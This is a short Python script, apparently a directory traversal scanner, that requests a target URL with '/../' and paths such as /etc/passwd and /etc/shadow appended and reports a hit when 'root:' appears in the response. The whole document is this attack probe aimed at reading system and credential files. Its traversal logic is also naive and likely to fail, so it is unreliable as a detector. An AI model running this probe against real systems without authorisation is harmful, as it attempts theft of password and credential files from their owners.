import requests

def directory_traversal_scan(target_url):
    # List of known paths to check for directory traversal vulnerability
    paths = ['/etc/passwd', '/etc/shadow', '/etc/group', '/etc/hosts']

    # Make a request to the target URL with each known path appended to the end
    for path in paths:
        url = target_url + '/../' + path
        response = requests.get(url)

        # Check the response for signs of a successful directory traversal attack
        if response.status_code == 200 and 'root:' in response.text:
            print(f"[+] Directory traversal vulnerability found at {url}")
            return True
    
    print("[-] No directory traversal vulnerabilities found.")
    return False
